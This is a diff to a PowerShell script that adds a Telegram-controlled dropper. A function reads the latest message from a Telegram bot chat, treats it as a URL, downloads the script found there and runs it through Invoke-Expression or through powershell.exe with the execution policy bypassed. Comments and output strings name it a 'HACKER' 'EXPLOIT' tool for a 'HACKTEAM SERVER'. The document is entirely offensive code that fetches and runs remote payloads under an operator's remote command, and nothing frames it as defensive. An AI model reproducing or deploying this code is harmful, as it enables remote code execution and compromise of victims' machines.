@@ -12,21 +12,45 @@ function Log-Message
 
 Log-Message " [*] START JOB ------------------- ELMO9AWIM "
 
+Function Get-File-PS-TELE-DROOPER{
+  Param(
+  [Parameter(Mandatory=$true,Position=0)] [String[]]$BId
+  [Parameter(Mandatory=$true,Position=1)] [String[]]$BToken
+  [Parameter(Mandatory=$False,Position=2)] [String[]]$Arguments,
+  
+  [Switch]
+  $nodownload
+ 
+  )
+  
+  
+  
+  
+  Write-Output "BOT ID: $BId || BOT TOKEN: $BToken"
 
 
-[CmdletBinding()] Param(
-        [Parameter(Position = 0, Mandatory = $True)]
-        [String]
-        $ScriptURL,
+  $MyToken = $BToken
+  $ChatID = $BId
+  $MyBotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($MyToken)/getUpdates"
+  #Convert the result from json and put them in an array
+  $jsonresult = [array]($MyBotUpdates | ConvertFrom-Json).result
 
-        [Parameter(Position = 1, Mandatory = $False)]
-        [String]
-        $Arguments,
+  $LastMessage = ""
+  Foreach ($Result in $jsonresult)  {
+    If ($Result.message.chat.id -eq $ChatID)  {
+      $LastMessage = $Result.message.text
+    }
+  }
 
-        [Switch]
-        $nodownload
-    )
-    if ($nodownload -eq $true)
+  Log-Message " [*] START DOWNLOADING ------------------- ELMO9AWIM "
+
+  Write-Host "RUN ME $LastMessage"
+
+  $TELEFILE = $LastMessage
+
+  $ScriptURL = $TELEFILE
+
+  if ($nodownload -eq $true)
     {
         Invoke-Expression ((New-Object Net.WebClient).DownloadString("$ScriptURL"))
         if($Arguments)
@@ -34,7 +58,7 @@ Log-Message " [*] START JOB ------------------- ELMO9AWIM "
             Invoke-Expression $Arguments
         }
     }
-    else
+  else
     {
         $rand = Get-Random
         $webclient = New-Object System.Net.WebClient
@@ -43,3 +67,16 @@ Log-Message " [*] START JOB ------------------- ELMO9AWIM "
         $script:pastevalue = powershell.exe -ExecutionPolicy Bypass -noLogo -command $file1
         Invoke-Expression $pastevalue
     }
+
+
+  Log-Message " [*] END JOB ------------------- ELMO9AWIM "
+  
+  Write-Host "RUN ME $FRun HACKER ---------------- EXPLOIT ?.> "
+  
+  
+}
+
+# Get-File-PS-TELE-DROOPER -BId "TELEGRAM ID" -BToken "TELEGRAM TOKEN" -Arguments "HACKTEAM SERVER"
+
+
+        
